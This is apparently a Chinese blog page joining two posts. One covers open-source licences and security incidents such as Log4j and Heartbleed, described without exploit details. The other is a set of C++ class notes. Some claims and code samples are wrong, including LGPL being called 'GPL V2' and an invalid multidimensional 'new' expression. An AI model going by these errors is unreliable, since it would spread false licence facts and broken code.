&lt;li&gt;MIT（Massachusetts Institute of Technology）协议&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;目前限制最少的开源许可协议之一（比 BSD 和 Apache 的限制都少），只要程序的开发者在修改后的源代码中保留原作者的许可信息即可，因此普遍被商业软件所使用。&lt;/p&gt;
&lt;p&gt;使用 MIT 协议的软件有 PuTTY、X Window System、Ruby on Rails、Lua 5.0 onwards、Mono 等。&lt;br&gt;
5. GUN LGPL（GNU Lesser General Public License，GNU 宽通用公共许可证）&lt;/p&gt;
&lt;p&gt;LGPL 是 GPL 的一个衍生版本，也被称为 GPL V2，该协议主要是为类库设计的开源协议。&lt;/p&gt;
&lt;p&gt;LGPL 允许商业软件通过类库引用（link）的方式使用 LGPL 类库，而不需要开源商业软件的代码。这使得采用 LGPL 协议的开源代码可以被商业软件作为类库引用并发布和销售。&lt;/p&gt;
&lt;p&gt;但是如果修改 LGPL 协议的代码或者衍生品，则所有修改的代码，涉及修改部分的额外代码和衍生的代码都必须采用 LGPL 协议。因此 LGPL 协议的开源代码很适合作为第三方类库被商业软件引用，但不适合希望以 LGPL 协议代码为基础，通过修改和衍生的方式做二次开发的商业软件采用。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;如何选择开源协议&#34;&gt; 如何选择开源协议&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;世界上的开源协议有上百种（有兴趣的读者请猛击这里了解），很少有人能彻底搞清它们之间的区别，即使在最流行的六种开源协议 ——GPL、BSD、MIT、Mozilla、Apache 和 LGPL—— 之中做选择，也很复杂。&lt;/p&gt;
&lt;p&gt;乌克兰程序员 Paul Bagwell 画了一张分析图，说明应该怎么选择开源协议，大家看了一目了然，真是清爽。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;开源等于免费吗&#34;&gt; 开源等于免费吗&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;首先，开源软件和免费软件是两个概念：&lt;/p&gt;
&lt;p&gt;开源软件是指公开源代码的软件。开源软件在发行的时候会附上软件的源代码，并授权允许用户更改、传播或者二次开发。&lt;/p&gt;
&lt;p&gt;免费软件就是免费提供给用户使用的软件。但是在免费的同时，通常也会有一些限制，比如源代码不公开，用户不能随意修改、不能二次发布等。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;免费软件的例子比比皆是，QQ、微信、迅雷、酷狗、360 等都是免费软件，你可以随意使用，尽情蹂躏；但是，如果你嫌弃它们复杂，自己删除了一些无用的功能，然后在网上发布了一个精简版本供大家下载，那么你就离法院的传票不远了。&lt;/li&gt;
&lt;li&gt;开源软件是不抵触商业的，开源的目的也不是做慈善事业，而是通过更多人的参与，减少软件的缺陷，丰富软件的功能，同时也避免了少数人在软件里留一些不正当的后门。开源软件最终还会反哺商业，让商业公司为用户提供更好的产品。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Android 就是大众最熟知的一款开源操作系统，它除了用在手机上，还用在汽车、平板电脑、电视、智能手表等其它硬件平台，小米、华为、OPPO、三星等都是 Android 的受益者，他们都赚得盆满钵满。&lt;/p&gt;
&lt;p&gt;很多著名的开源项目背后都有商业公司支撑，它们的开发者也都有正式的工作，享受和我们一样的社会福利；如果一个成功的开源项目背后没有商业公司，这反而是不健康的，社会需要开源和商业之间的互补来促进技术的革新。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;不可忽视的安全隐患&#34;&gt; 不可忽视的安全隐患&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;就在刚刚过去的 2021 年，技术圈传出了一个爆炸性的新闻，Log4j 安全漏洞影响了上亿家公司，造成了无法计量的损失，使无数的程序员度过了一个难熬的不眠夜。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Log4J 是一个应用非常广泛的Java库，就在前两天的2021年12月10日，Log4J的一个安全漏洞被公布了。那天正好是周五，很多程序员都在计划着怎么度过一个愉快的周末，不料这个安全漏洞的公开，使得全世界很多程序员不得不周末加班，有的甚至通宵达旦紧急应对。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;漏洞编号为CVE-2021-44228 ，攻击者利用这个新的零日漏洞，可以远程执行恶意代码。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;零日漏洞（ zero-day ）通常是指还没有补丁的安全漏洞。零日漏洞利用（zero-day exploit）的程序对网络安全具有巨大威胁，因此零日漏洞不但是黑客的最爱，掌握多少零日漏洞也成为评价黑客技术水准的一个重要参数。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;正是因为开源技术 “开放” 和 “自由” 的特点，它也更容易成为居心叵测之人下手的目标。黑客们有机会对项目的源代码进行分析、修改，并使用各种方法来遮盖对开源项目做出的恶意更改。再加上代码审查的严格程度因项目而异， 如果没有严格的审查措施来检测这些恶意更改，它们很容易就会被忽视，直到它们扩散开来，被使用在众多公司的软件中。&lt;/p&gt;
&lt;p&gt;与 Log4j 类似的情况比比皆是。EspoCRM，Pimcore，Akaunting 作为三个被数千家公司使用的开源软件，在企业的用户关系管理、客户数据管理、数字资产管理以及财会方面发挥着至关重要的作用。它们也曾被爆出致命漏洞，成功利用这些漏洞可以使绕过身份验证的攻击者执行任意 JavaScript 代码，控制底层操作系统并发起额外的恶意攻击，还可以通过特制的 HTTP 请求触发拒绝服务，甚至更改与用户账户关联的公司，且无需任何授权。&lt;/p&gt;
&lt;p&gt;在 2014 年席卷整个互联网世界的 OpenSSL Heartbleed（心脏出血）漏洞，不仅让整个中国互联网为之一颤，而且导致全球超过三分之二的网站 “心脏出血”，使全球互联网大量私钥和其他加密信息处于暴露危险下，受影响严重的系统甚至可以从服务器中直接获取用户密码。这一起起的开源安全事故，无不在印证着开源技术的安全风险。&lt;/p&gt;
&lt;p&gt;虽然开源技术确实很容易成为黑客们攻击的目标，但是我们还是可以通过一些手段，来中和使用开源技术带来的安全风险，把可能的损失降到最低。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;测试和制度&lt;br&gt;
首先，完善的测试和应急响应制度可以让企业更早的发现开源技术中的漏洞，更快的对其进行响应。 这主要分为三个部分：代码扫描和测试，建立一个明确的流程来解决和修复出现的漏洞、将解决安全问题的规则包含在公司策略中 bing。&lt;/li&gt;
&lt;li&gt;开源技术安全需要行业共同努力&lt;br&gt;
其实，目前包括 Linux，Apache 这样的顶级开源基金会都在呼吁大家重视开源技术的安全，并也付出了努力。包括资金的支持、开发安全工具、培训、研究和最佳实践。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了全行业努力保护基于开源代码构建的软件免受威胁外，企业也要对其防御战略有一个积极的态度。包括积极的为他们所依赖的开源代码实施测试并将数据积极向上游反馈。企业也应该制定合理的内部政策和指南，来识别使用开源软件的风险。如此做可以让企业继续利用开源代码的优势，同时也能创建一个能够预防可能威胁的环境。&lt;/p&gt;

 &lt;h2&gt;&lt;span id=&#34;const-修饰符&#34;&gt; const 修饰符&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;1.const 作用与 #define 相似，但是它消除了 #define 的不安全性比如：&lt;br&gt;
#define T1 a+a&lt;br&gt;
#define T2 T1-T1&lt;br&gt;
2.const 与指针组合可以归纳为 3 种类型；&lt;br&gt;
(1) 指向常量的指针&lt;br&gt;
 3. 指向常量的指针&lt;br&gt;
 const char * name=“chen”;&lt;br&gt;
name=“zhang”;&lt;br&gt;
4. 常指针&lt;br&gt;
 char * const name=“chen”;&lt;br&gt;
name[3]=‘a’;&lt;br&gt;
5. 指向常量的常指针&lt;br&gt;
 const char * const name=“chen”;&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;内联函数&#34;&gt; 内联函数&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;原因：为了消除函数调用时的系统开销，以提高运行速度。&lt;br&gt;
inline int box(int i,int j,int k)&lt;br&gt;
int main()&lt;br&gt;
{&lt;br&gt;
int a,b,c,v;&lt;br&gt;
cin&amp;gt;&amp;gt;a&amp;gt;&amp;gt;b&amp;gt;&amp;gt;c;&lt;br&gt;
v=box(a,b,c);&lt;br&gt;
cout&amp;lt;&amp;lt;“a * b * c=”&amp;lt;&amp;lt;v&amp;lt;&amp;lt;endl;&lt;br&gt;
return 0;&lt;br&gt;
}&lt;br&gt;
inline int box(int i,int j,int k)&lt;br&gt;
{&lt;br&gt;
return i * j * k;&lt;br&gt;
}&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;带有默认参数的函数&#34;&gt; 带有默认参数的函数&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;要求：在声明函数时，所有带有默认值的参数必须出现在不指定默认值参数的右边。&lt;br&gt;
错误：int fun (int i,int j=5,int k);&lt;br&gt;
 正确：int fun (int i,int k,int j=5);&lt;/li&gt;
&lt;li&gt;要求：函数调用时，如果某一个参数省略，后面的参数只能省略采取默认值，不能赋予新的值。&lt;br&gt;
错误：special (,21.5);&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;函数的重载&#34;&gt; 函数的重载&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;含义：当两个或两个以上的函数共有一个函数名时，称为函数的重载。&lt;br&gt;
例如：&lt;br&gt;
int square(int i)&lt;br&gt;
{&lt;br&gt;
return i * i;&lt;br&gt;
}&lt;br&gt;
long square(long l)&lt;br&gt;
{&lt;br&gt;
return l * l;&lt;br&gt;
}&lt;br&gt;
double square(double d)&lt;br&gt;
{&lt;br&gt;
return d * d;&lt;br&gt;
}&lt;/li&gt;
&lt;li&gt;注意：调用重载函数时，如果两个函数的参数和类型都相同，而只有返回值类型不同，则不允许重载。&lt;br&gt;
例如：&lt;br&gt;
int mul(int x,int y);&lt;br&gt;
double mul(int x,int y);&lt;br&gt;
 不允许重载&lt;/li&gt;
&lt;li&gt;注意：函数的重载与带默认值的函数一起使用时，有可能引起二义性&lt;br&gt;
比如：&lt;br&gt;
void Drawcircle(int r=0,int x=0,int y=0);&lt;br&gt;
void Drawcircle(int r);&lt;br&gt;
 当执行 Drawcircle (20);&lt;br&gt;
 系统无法确定调用哪一个函数&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;作用域运算符-quotquot&#34;&gt; 作用域运算符 &amp;quot;::&amp;quot;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;通常情况下，局部变量在作用域内具有较高的优先权，它将屏蔽全局变量。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果希望在局部变量的作用域内使用同名的全局变量，可以在这个变量前加上 &amp;quot;::&amp;quot;,&amp;quot;::&amp;quot; 称为：作用域运算符&lt;br&gt;
例如：&lt;br&gt;
int avar;&lt;br&gt;
int main()&lt;br&gt;
{&lt;br&gt;
int avar;&lt;br&gt;
avar=25;   // 给局部变量赋值 25&lt;br&gt;
::avar=10;  // 给全局变量赋值&lt;br&gt;
 cout&amp;lt;&amp;lt;“local avar=”&amp;lt;&amp;lt;avar&amp;lt;&amp;lt;endl;&lt;br&gt;
cout&amp;lt;&amp;lt;“global avar =”&amp;lt;&amp;lt;::avar&amp;lt;&amp;lt;endl;&lt;br&gt;
return 0;&lt;br&gt;
}&lt;br&gt;
 输出：&lt;br&gt;
local avar =25&lt;br&gt;
global avar =10&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;运算符-new-和-delete&#34;&gt; 运算符 new 和 delete&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;new&lt;br&gt;
int * p;&lt;br&gt;
p=new int;&lt;/li&gt;
&lt;li&gt;delete&lt;br&gt;
delete p;&lt;/li&gt;
&lt;li&gt;注意：&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;使用 new 为多维数组分配空间时，必须提供所有维的大小&lt;br&gt;
如：int * pi =new int [2][3][4];&lt;/li&gt;
&lt;li&gt;new 可在为简单变量分配内存的同时，进行初始化。&lt;br&gt;
指针变量名 = new 类型（初值）&lt;br&gt;
int * p;&lt;br&gt;
p=new int(99);&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;引用&#34;&gt; 引用&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;别名&lt;br&gt;
 int i=5;&lt;br&gt;
int &amp;amp;j=i;&lt;br&gt;
 注意：i 和 j 的地址一样，i 和 j 同时变化。&lt;br&gt;
不能建立 void 类型&lt;br&gt;
不能建立引用的数组&lt;br&gt;
不能建立引用的引用&lt;/li&gt;
&lt;li&gt;引用作为函数参数&lt;br&gt;
例如：&lt;br&gt;
void swap(int &amp;amp;m,int &amp;amp;n)&lt;br&gt;
{&lt;br&gt;
int temp;&lt;br&gt;
temp=m;&lt;br&gt;
m=n;&lt;br&gt;
n=temp;&lt;br&gt;
}&lt;br&gt;
int main()&lt;br&gt;
{&lt;br&gt;
int a=5,b=10;&lt;br&gt;
swap(a,b);&lt;br&gt;
}&lt;/li&gt;
&lt;li&gt;使用引用返回函数值&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;结构体与类&#34;&gt; 结构体与类&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;类是对象的抽象，对象是类的实例。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注意：私有成员 (数据成员和成员函数) 只能被类内的成员函数访问，不能被类外的对象访；公有成员都可以被访问&lt;/li&gt;
&lt;li&gt;注意：在实际应用中，一般把需要保护的数据设置为私有的，把它隐蔽起来，把成员函数设置为公有的，作为类与外界的接口。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;成员函数的定义&#34;&gt; 成员函数的定义&lt;/span&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span id=&#34;静态成员&#34;&gt; 静态成员&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;静态数据成员&lt;br&gt;
 1. 当我们想要用在__同一个类中 (学生类)&lt;strong&gt; 任何一个对象__共享__一个数据 (这个数据可以累计前面对象的数据情况，不会随着定义下一个对象就刷新)(&lt;strong&gt;平均分、学生总人数、总成绩…&lt;/strong&gt;)，就应该将这个数据定义为静态数据成员&lt;br&gt;
 2. 虽然将数据成员定义为全局变量也可以达到同样的目的，但是全局变量具有__不安全性&lt;/strong&gt;，&lt;strong&gt;破坏面对象程序的封装性__特点&lt;br&gt;
 3.&lt;strong&gt; 格式：&lt;/strong&gt;&lt;br&gt;
static 数据成员 数据成员名&lt;br&gt;
 4. 静态数据成员初始化应该在类外单独进行，而且在定义对象之前进行&lt;br&gt;
 5.&lt;strong&gt; 初始化格式：&lt;/strong&gt;&lt;br&gt;
数据类型 类名：：静态数据成员名 = 初始值&lt;br&gt;
注意：数据成员名之前不要加 static&lt;br&gt;
6.&lt;strong&gt; 静态数据成员属于类&lt;/strong&gt;，而__普通数据成员属于对象&lt;/strong&gt;，因此在访问静态数据成员时，__可以 (并非只能)__用类名访问，格式：&lt;br&gt;
类名：：静态数据成员名&lt;br&gt;
 7. 用对象访问静态数据成员格式：&lt;br&gt;
对象名。静态数据成员名&lt;br&gt;
 8. 私有静态数据成员不能在类外被访问，应该通过公有成员函数访问&lt;/li&gt;
&lt;li&gt;静态数据成员函数&lt;br&gt;
 1. 静态成员函数属于整个类，是该类所有对象共享的成员函数&lt;br&gt;
 2.&lt;strong&gt; 格式：&lt;/strong&gt;&lt;br&gt;
static 返回类型 静态成员函数名 (参数表)；&lt;br&gt;
3.&lt;strong&gt; 调用格式:&lt;/strong&gt;&lt;br&gt;
(规范) 类名：：静态成员函数名 (实参表)&lt;br&gt;
 4. 使用静态成员函数其中一个原因是，可以用它在建立任何对象之前调用静态成员函数，以处理静态数据成员。原因：&lt;strong&gt;在调用静态成员函数中的静态成员已经被初始化&lt;/strong&gt;，可以用来调用以及运算&lt;br&gt;
 5. 编译系统将静态成员函数限定为内部连接，所以其他文件中的同名函数不会与该函数发生冲突&lt;br&gt;
 6. 静态成员函数与非静态成员函数的区别为：&lt;strong&gt;非静态成员函数有 this 指针，而静态成员函数没有&lt;/strong&gt;&lt;br&gt;
 7. 一般来说__静态成员函数不能访问类中的非静态成员__，若要访问只能通过 (对象名、&lt;strong&gt;对象指针、对象引用&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;友元&#34;&gt; 友元&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;友元函数&lt;br&gt;
 1. 类中的私有成员是受保护的，只有类中的成员函数能访问 (一般调用构造函数), 此时友元函数便可以作为一个小口子用来访问其中的私有成员&lt;br&gt;
 2. 既可以是不属于类的非成员函数 (普通函数)，也可以是另一个类的成员函数&lt;br&gt;
 3. 友元函数可以定义在类的内部，也可以定义在类的外部&lt;br&gt;
 4. 定义友元函数需要在函数名之前加上关键字 friend&lt;br&gt;
5. 由于友元函数权限范围很大，不可具体划分为某一类成员函数，属于一种特殊的函数，因此在外部定义时，&lt;strong&gt;按照普通函数的定义即可&lt;/strong&gt;&lt;br&gt;
 6. 友元函数时特殊的函数，&lt;strong&gt;不属于类的成员&lt;/strong&gt;，所以它不能直接访问对象的数据成员，也不可以通过 this 指针访问，&lt;strong&gt;必须通过 (对象指针或者对象的引用) 来实现&lt;/strong&gt;&lt;br&gt;
 7.&lt;strong&gt; 使用友元函数可以提高运行效率&lt;/strong&gt;&lt;br&gt;
类中的私有成员不可以被类外部访问，必须构造函数进行调用，这时候，如果大量需要访问私有成员，就会不停的调用函数进行访问，浪费时间，降低运行效率&lt;/li&gt;
&lt;li&gt;将成员函数声明为友元函数&lt;br&gt;
 1. 当有两个类时，我想要__两个类中的数据有共同使用的部分__(&lt;strong&gt;在一个类中调用另一个类中的私有数据成员&lt;/strong&gt;)，&lt;strong&gt;就可以在其中一个类 A 中将函数声明为它的成员函数，在另一个类 B 中声明为 A 中的成员函数为 B 的友元函数，其中 A 中的私有数据成员可以直接 cout,B 中要访问私有数据成员就要用 (对象指针或者对象的引用) 来调用私有数据成员来 cout&lt;/strong&gt;&lt;br&gt;
2. 注意类的引用声明以及定义&lt;/li&gt;
&lt;li&gt;友元类&lt;br&gt;
 1. 格式：&lt;br&gt;
friend 类名；&lt;br&gt;
2. 当类 Y 被说明为类 X 的友元时，类 Y 中的所有成员函数都可以访问 X 中的__所有__数据成员&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;类的组合&#34;&gt; 类的组合&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;class X&lt;br&gt;
{&lt;br&gt;
类名 1  对象成员 1；&lt;br&gt;
类名 2  对象成员 2；&lt;br&gt;
.&lt;br&gt;
.&lt;br&gt;
.&lt;br&gt;
 类名 n  对象成员 n;&lt;br&gt;
}；&lt;br&gt;
类 X 的构造函数定义为：&lt;br&gt;
X::X (形参表 0）：对象成员 1（形参表 1），对象成员 2（形参表 2），…&lt;br&gt;
{&lt;br&gt;
// 类 X 的函数构造体&lt;br&gt;
}&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;常类型&#34;&gt; 常类型&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;常类型是指使用类型修饰符 const 说明的类型，常类型的变量或者对象成员的值在程序运行期间是不可以改变的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常引用&lt;br&gt;
例如：&lt;br&gt;
int a=5;&lt;br&gt;
const int &amp;amp;b=a;&lt;br&gt;
b 是一个常引用，这时候 b 的 值可以随 a 的值而改变 (可以改变 a 的值)，而不可以改变 b 的值&lt;/li&gt;
&lt;li&gt;常对象&lt;br&gt;
常对象的数据成员值在整个生存期内不能被改变&lt;br&gt;
格式：&lt;br&gt;
类名 const 对象名 [(参数表)]；&lt;br&gt;
或者&lt;br&gt;
 const 类名 对象名 [(参数表)]；&lt;br&gt;
&lt;strong&gt;常对象不能调用普通成员函数&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;在定义对象时必须进行初始化，而且不能被更新&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;常对象成员&lt;br&gt;
 1. 常数据成员&lt;br&gt;
使用 const 说明的数据成员称为常数据成员，如果一个类中说明了常数据成员，那么构造函数就只能通过成员初始化列表对该数据成员进行初始化，并且其他任何函数都不能对该成员赋值&lt;/li&gt;
&lt;li&gt;常成员函数&lt;br&gt;
在类中使用关键字 const 说明的成员函数为常成员函数&lt;br&gt;
格式：&lt;br&gt;
类型说明符  函数名 (参数表) const；&lt;br&gt;
常成员函数可以访问常数据成员，也可以访问普通数据成员。常数据成员可以被常成员函数访问也可以被普通成员函数访问&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;派生类的概念&#34;&gt; 派生类的概念&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;当两个类有很多相同的地方，为了提高代码的可重用性，可以引入继承&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;派生类的声明&lt;br&gt;
 class 派生类名：[继承方式] 基类名&lt;br&gt;
 {派生类新增的数据成员和成员函数}；&lt;br&gt;
继承方式可以为：private (私有继承)、protected (保护继承)、public (公有继承)&lt;br&gt;
 如果没有给出继承方式，系统默认为私有继承&lt;/li&gt;
&lt;li&gt;派生类的构成&lt;br&gt;
派生类把基类的全部成员 (除构造函数和析构函数之外) 接收过来&lt;/li&gt;
&lt;li&gt;基类成员在派生类中的访问属性&lt;br&gt;
 1. 基类中的私有成员&lt;br&gt;
无论哪种继承方式，基类中的私有成员不允许派生类继承&lt;br&gt;
 2. 基类中的公有成员&lt;br&gt;
当类中的成员以什么方式继承时，基类中的所有公有成员就以什么成员的方式出现&lt;br&gt;
 3. 基类中的保护成员&lt;br&gt;
当类中的成员以公有或保护方式继承时，基类中的所有保护成员就以保护成员的方式出现&lt;br&gt;
当类中的成员为私有继承时，基类中的所有保护成员就以私有成员的方式继承&lt;/li&gt;
&lt;li&gt;派生类对基类成员的访问属性&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;基类中的成员&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;在公有派生类&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;在私有派生类&lt;/th&gt;
&lt;th&gt;在保护派生类&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;私有成员&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;不可直接访问&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;不可直接访问&lt;/td&gt;
&lt;td&gt;不可直接访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;公有成员&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;公有&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;私有&lt;/td&gt;
&lt;td&gt;保护&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;保护成员&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;保护&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;私有&lt;/td&gt;
&lt;td&gt;保护&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;派生类对基类成员的访问规则&lt;br&gt;
类的继承方式有 public (公有继承)、protected (保护继承)、private (私有继承)&lt;br&gt;
 访问形式：内部访问、对象访问&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;私有继承访问规则&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;基类中的成员&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;私有成员&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;公有成员&lt;/th&gt;
&lt;th&gt;保护成员&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;内部访问&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;不可访问&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;可访问&lt;/td&gt;
&lt;td&gt;可访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;对象访问&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;不可访问&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;不可访问&lt;/td&gt;
&lt;td&gt;不可访问&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;公有继承访问规则&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;基类中的成员&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;私有成员&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;公有成员&lt;/th&gt;
&lt;th&gt;保护成员&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;内部访问&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;不可访问&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;可访问&lt;/td&gt;
&lt;td&gt;可访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;对象访问&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;不可访问&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;可访问&lt;/td&gt;
&lt;td&gt;不可访问&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;保护继承访问规则&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;基类中的成员&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;私有成员&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;公有成员&lt;/th&gt;
&lt;th&gt;保护成员&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;内部访问&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;不可访问&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;可访问&lt;/td&gt;
&lt;td&gt;可访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;对象访问&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;不可访问&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;不可访问&lt;/td&gt;
&lt;td&gt;不可访问&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;span id=&#34;派生类的构造函数和析构函数&#34;&gt; 派生类的构造函数和析构函数&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;派生类构造函数和析构函数的执行顺序&lt;br&gt;
构造函数：&lt;br&gt;
1. 基类构造函数&lt;br&gt;
 2. 派送类构造函数&lt;br&gt;
析构函数：&lt;br&gt;
1. 派生类析构函数&lt;br&gt;
 2. 基类析构函数&lt;/li&gt;
&lt;li&gt;派生类构造函数和析构函数的构造规则&lt;br&gt;
派生类名 (参数总表)：基类名 (参数表)&lt;br&gt;
{&lt;br&gt;
派生类新增数据成员初始化语句&lt;br&gt;
}&lt;br&gt;
&lt;strong&gt; 注意：&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;在类中声明派生类的构造函数时，不包括基类构造函数名及其参数表，只有在类外定义时才将它列出&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;派生类的析构函数&lt;br&gt;
析构函数调用顺序与构造函数相反&lt;/li&gt;
&lt;li&gt;含有对象成员 (子对象) 的派生类的构造函数&lt;br&gt;
派生类名 (参数总表)：基类名 (参数表 0)，对象成员名 1 (参数表 1)，…，对象成员名 n (参数表 n)&lt;br&gt;
{&lt;br&gt;
派生类新增成员的初始化语句&lt;br&gt;
}&lt;br&gt;
